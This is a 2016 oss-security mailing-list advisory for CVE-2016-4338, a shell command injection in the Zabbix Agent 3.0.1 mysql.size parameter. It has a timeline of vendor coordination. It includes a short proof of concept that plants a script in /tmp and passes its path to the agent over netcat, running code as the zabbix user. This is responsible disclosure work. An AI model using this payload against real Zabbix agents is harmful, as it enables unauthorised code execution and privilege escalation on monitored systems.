X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3707" "Wednesday" "4" "May" "2016" "12:28:13" "+0300" "Timo Juhani Lindfors" "timo.lindfors@iki.fi" "<84vb2uf9zm.fsf@sauna.l.org>" "91" "[oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection" "^Date:" nil nil "5" "2016050409:28:13" "[oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection" (number mark "U       timo.lindfor May  4   91/3707  " thread-indent "\"[oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 21885 invoked by uid 550); 4 May 2016 09:44:22 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 32413 invoked from network); 4 May 2016 09:28:25 -0000
Message-ID: <84vb2uf9zm.fsf@sauna.l.org>
User-Agent: Gnus/5.13 (Gnus v5.13) Emacs/23.2 (gnu/linux)
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
X-SA-Exim-Connect-IP: 2001:2003:f813:ef00:222:15ff:fe58:71e8
X-SA-Exim-Mail-From: timo.lindfors@iki.fi
X-SA-Exim-Scanned: No (on mail.kapsi.fi); SAEximRunCond expanded to false
Date: Wed, 04 May 2016 12:28:13 +0300
From: Timo Juhani Lindfors <timo.lindfors@iki.fi>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection
To: oss-security@lists.openwall.com

CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection
--------------------------------------------------------------------

Affected products
=================

At least Zabbix Agent 1:3.0.1-1+wheezy from
http://repo.zabbix.com/zabbix/3.0/debian is vulnerable. Other versions
were not tested.

Background
==========

"Zabbix agent is deployed on a monitoring target to actively monitor
 local resources and applications (hard drives, memory, processor
 statistics etc).

 The agent gathers operational information locally and reports data to
 Zabbix server for further processing. In case of failures (such as a
 hard disk running full or a crashed service process), Zabbix server
 can actively alert the administrators of the particular machine that
 reported the failure.

 Zabbix agents are extremely efficient because of use of native system
 calls for gathering statistical information."

 -- https://www.zabbix.com/documentation/3.0/manual/concepts/agent

Description
===========

Zabbix agent listens on port 10050 for connections from the Zabbix
server. The commands can be built-in or user-defined.

The mysql.size user parameter defined in
/etc/zabbix/zabbix_agentd.d/userparameter_mysql.conf takes three input
parameters and uses a shell script to generate an SQL query:

UserParameter=mysql.size[*],echo "select sum($(case "$3" in both|"") echo "data_length+index_length";; data|index) echo "$3_length";; free) echo "data_free";; esac)) from information_schema.tables$([[ "$1" = "all" || ! "$1" ]] || echo " where table_schema='$1'")$([[ "$2" = "all" || ! "$2" ]] || echo "and table_name='$2'");" | HOME=/var/lib/zabbix mysql -N

The code assumes that /bin/sh is bash that supports the [[ compound
command. However, if /bin/sh is for example dash the statement

[[ "$1" = "all" || ! "$1" ]]

ends up executing the command "$1" with the argument "]]".

Exploit
=======

Zabbix sanitizes the input and blocks many dangerous characters
("\\'\"`*?[]{}~$!&;()<>|#@\n"). Since we cannot use quotes we cannot
give our shell commands any parameters which significantly reduces the
impact of this vulnerability. If you find a way to execute arbitrary
commands using this flaw I'd be really interested in the details. The
following proof-of-concept shows how the vulnerability can be used
escalate privileges locally:

$ echo -en '#!/bin/bash\necho "This code is running as $(id)" 1>&2\n' > /tmp/owned
$ chmod a+rx /tmp/owned
$ echo 'mysql.size[/tmp/owned,all,both]' | nc localhost 10050 | cat -A
ZBXD^AM-^O^@^@^@^@^@^@^@sh: 1: [[: not found$
This code is running as uid=110(zabbix) gid=114(zabbix) groups=114(zabbix)$
sh: 1: [[: not found$
sh: 1: all: not found$

The exploit of course assumes that the Server line in the
configuration includes "127.0.0.1". If the agent is configured to
accept connections only from the Zabbix server. In that case this
issue can only be exploited from the server or by spoofing the IP
address of the server (with for example ARP spoofing).

Since output of the command is piped to mysql it might be possible to
also execute some SQL commands in the database.

Author
======

This issue was discovered by Timo Lindfors from Nixu Corporation.

Timeline
========

2016-04-19: Issue discovered and reported internally for verification.
2016-04-21: Issue reported to vendor.
2016-04-22: Vendor acknowledges vulnerability and starts patching.
2016-04-26: Asked status update from vendor.
2016-04-26: Vendor responds that the issue is still being patched.
2016-04-26: CVE requested from MITRE.
2016-04-28: MITRE assigned CVE-2016-4338 for this vulnerability.
2016-05-02: Vendor published details in the issue tracker https://support.zabbix.com/browse/ZBX-10741
